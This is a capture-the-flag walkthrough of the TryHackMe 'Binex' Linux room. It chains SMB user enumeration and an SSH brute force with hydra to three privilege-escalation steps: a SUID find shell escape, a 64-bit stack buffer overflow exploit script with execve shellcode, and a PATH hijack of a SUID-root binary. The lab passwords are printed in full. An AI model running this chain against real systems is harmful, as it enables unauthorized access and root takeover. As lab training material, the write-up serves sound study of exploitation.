---
room: Binex
url: https://tryhackme.com/room/binexpl0itati0n
category: linux
difficulty: Medium
os: Linux
tags: [smb, enum4linux, hydra, ssh, suid, gtfobins, buffer-overflow, path-hijack, privesc]
status: complete
started: 2026-09-12
completed: 2026-09-13
---

# Binex

> A binary-exploitation privesc chain. SMB null-session enumeration reveals local
> users; the "longest name" user (`tryhackme`) is brute-forced over SSH for the
> foothold. From there, three SUID binaries are chained to hop between users up
> to root: a SUID `find` (GTFOBins), a 64-bit stack buffer overflow, and a SUID
> binary that calls `ps` by a relative path (PATH hijack).

| | |
|---|---|
| **Room** | [Binex](https://tryhackme.com/room/binexpl0itati0n) |
| **Difficulty** | Medium |
| **Target OS** | Linux (Ubuntu 18.04) |
| **Attack path** | SMB users -> SSH brute (tryhackme) -> SUID find (des) -> BOF (kel) -> PATH hijack (root) |

---

## 1. Recon

### Port scan

```bash
export IP=10.48.145.89
nmap -sC -sV -p- -T4 --min-rate=1000 $IP
```

| Port | Service | Version | Notes |
|---|---|---|---|
| 22/tcp | ssh | OpenSSH 7.6p1 (Ubuntu) | login vector once creds found |
| 139/tcp | netbios-ssn | Samba 3.X - 4.X | |
| 445/tcp | netbios-ssn | Samba 4.7.6-Ubuntu | null session allowed |

Host `THM_EXPLOIT`, SMB signing disabled, guest/NULL session supported.

---

## 2. Enumeration

### SMB shares (no useful data)

```bash
smbclient -L $IP -U anonymous
```

Only `print$` and `IPC$` (both NO ACCESS). No file share to loot.

### Enumerate users with enum4linux

Samba leaks local users over the RID cycle even with a null session:

```bash
enum4linux -r $IP
```

```
S-1-22-1-1000 Unix User\kel
S-1-22-1-1001 Unix User\des
S-1-22-1-1002 Unix User\tryhackme
S-1-22-1-1003 Unix User\noentry
```

The room hint: the foothold user is the one with the **longest name** ->
`tryhackme`.

---

## 3. Foothold - SSH brute force

```bash
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://$IP -I -T 6
```

```
[22][ssh] host: 10.48.145.89   login: tryhackme   password: thebest
```

```bash
ssh tryhackme@$IP        # password: thebest
```

Shell as `tryhackme` on Ubuntu 18.04.

---

## 4. Privesc step 1 - SUID `find` -> user `des`

`tryhackme` cannot enter `/home/des`, but a SUID binary owned by `des` can act
as `des`. Hunt for SUID files owned by that user:

```bash
find / -type f -perm -04000 -user des -exec ls -ldb {} \; 2>/dev/null
# -rwsr-sr-x 1 des des 238080 /usr/bin/find
```

`find` is [GTFOBins](https://gtfobins.github.io/gtfobins/find/)-able: its
`-exec` runs a command with the binary's privileges.

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
```

```
bash-4.4$ id
uid=1002(tryhackme) gid=1002(tryhackme) euid=1001(des) egid=1001(des) groups=1001(des),1002(tryhackme)
```

`euid=des`, so `/home/des` is readable:

```bash
cd /home/des && cat flag.txt
# Flag 1: THM{... redacted ...}  ("exploit the SUID")
```

The flag file also hands over `des` credentials:

```
username: des
password: destructive_72656275696c64
```

`des` owns two interesting files here: `bof` (SUID, owned by **kel**) and its
source `bof64.c`.

---

## 5. Privesc step 2 - 64-bit stack buffer overflow -> user `kel`

`/home/des/bof` is SUID owned by `kel`. It reads a string into a fixed stack
buffer with no bounds check - a classic overflow. ASLR is effectively off on the
box, so stack addresses are stable across runs.

### Crash and confirm control of RIP

```bash
gdb ./bof
(gdb) r < <(python -c 'print("A" * 700)')
# SIGSEGV, rbp = 0x4141414141414141  -> we control saved registers
```

### Find the offset

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# feed it to the program, crash, then:
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 4134754133754132
# [*] Exact match at offset 608
```

So saved RBP sits at offset 608, and the return address (RIP) follows at 616.

### Build the exploit

Return into a NOP sled that leads to `execve("/bin//sh")` shellcode placed on the
stack. `bo.py`:

```python
from struct import pack

# execve("/bin//sh") shellcode (24 bytes)
buf  = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

payload  = "\x90" * 400          # NOP sled
payload += buf                   # shellcode
payload += "A" * (208 - len(buf))# pad to saved RBP (offset 608)
payload += "B" * 8               # overwrite saved RBP
payload += pack("<Q", 0x7fffffffe300)  # RIP -> into the NOP sled
print(payload)
```

### Fire it

Keep stdin open with a trailing `cat` so the spawned shell stays interactive:

```bash
python bo.py > test
(cat test; cat) | ./bof
```

```
id
uid=1000(kel) gid=1001(des) groups=1001(des)
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
```

Now `kel`:

```bash
cd /home/kel && cat flag.txt
# Flag 2: THM{... redacted ...}  ("buffer overflow in 64 bit")
```

`kel` credentials from the flag file:

```
username: kel
password: kelvin_74656d7065726174757265
```

`/home/kel` holds `exe` (SUID **root**) and `exe.c`.

---

## 6. Privesc step 3 - PATH hijack -> root

`exe.c` runs `ps` by name, not by absolute path, while running as root:

```c
void main() {
    setuid(0);
    setgid(0);
    system("ps");     // resolved via $PATH -> hijackable
}
```

Put a malicious `ps` (just a shell) earlier in `PATH`:

```bash
cp /bin/bash /tmp/ps
export PATH=/tmp:$PATH
cd /home/kel && ./exe
```

```
root@THM_exploit:/home/kel# id
uid=0(root) ...
cat /root/root.txt
# Flag 3: THM{... redacted ...}  ("SUID binary and PATH exploit")
```

Root.

---

## 7. Flags

Values kept local per repo convention.

| Flag | Location | Theme |
|---|---|---|
| Binary 1 | `/home/des/flag.txt` | SUID find abuse |
| Binary 2 | `/home/kel/flag.txt` | 64-bit buffer overflow |
| Binary 3 (root) | `/root/root.txt` | SUID + PATH hijack |

---

## 8. Key answers

- **Open ports:** 22 (SSH), 139/445 (Samba)
- **User enumeration:** `enum4linux -r` via SMB null session
- **Foothold user:** `tryhackme` (longest username), SSH password `thebest`
- **des via:** SUID `/usr/bin/find` -> `find . -exec /bin/bash -p \; -quit`
- **kel via:** stack BOF in `/home/des/bof`, offset **608**, ret into NOP sled
- **root via:** PATH hijack of `system("ps")` in SUID `/home/kel/exe`

---

## 9. Lessons learned

- SMB null-session RID cycling (`enum4linux -r`) is the fastest way to a
  username list on Samba - always try it before brute forcing blind.
- A SUID binary owned by *another user* is a lateral-move primitive, not just a
  root one. Chain them user by user.
- For a stack BOF: crash with a cyclic pattern, get the offset with
  `pattern_offset.rb`, then a NOP sled plus a stack return address is enough when
  ASLR/NX are off. Keep stdin alive with `(cat payload; cat) | ./bin`.
- `system("cmd")` with a bare command name is a PATH-hijack waiting to happen;
  check the source of any SUID-root binary for relative command calls.

## 10. References

- SUID / GTFOBins: `notes/cheatsheets/suid-gtfobins.md` (find: https://gtfobins.github.io/gtfobins/find/)
- Privilege escalation checklist: `notes/cheatsheets/privesc.md`
- Reverse shell / TTY stabilisation: `notes/cheatsheets/reverse-shells.md`
- 64-bit stack overflow primer: https://book.hacktricks.xyz/binary-exploitation/stack-overflow
